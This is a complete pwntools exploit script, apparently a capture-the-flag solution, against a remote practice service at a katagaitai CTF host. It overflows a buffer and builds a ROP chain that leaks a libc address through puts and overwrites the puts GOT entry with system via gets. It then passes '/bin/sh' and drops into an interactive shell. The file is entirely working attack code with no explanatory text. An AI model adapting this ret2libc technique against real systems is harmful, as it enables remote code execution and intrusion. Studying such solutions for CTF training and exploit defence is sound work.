from pwn import *

target = remote("pwn-study.katagaitai-ctf.com", 9040)

bss_writable = 0x404040 + 0x100

puts_plt = 0x401030
puts_got = 0x404018
gets_plt = 0x401040

pop_rdi = 0x401253

libc_puts_off = 0x84420
libc_system_off = 0x52290

payload = b"A" * 40
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)

payload += p64(pop_rdi)
payload += p64(bss_writable)
payload += p64(gets_plt)

payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(gets_plt)

payload += p64(pop_rdi)
payload += p64(bss_writable)
payload += p64(puts_plt)

_ = target.recvuntil(b"[*] please input your name!\n")
target.sendline(payload)

_ = target.recvuntil(b"[*] See you Next time!\n")

libc_base = u64(target.recvline()[:-1].ljust(8, b"\x00")) - libc_puts_off
print("[*] libc base addr : 0x{:x}".format(libc_base))

system_addr = libc_base + libc_system_off

target.sendline(b"/bin/sh\x00")
target.sendline(p64(system_addr))

target.interactive()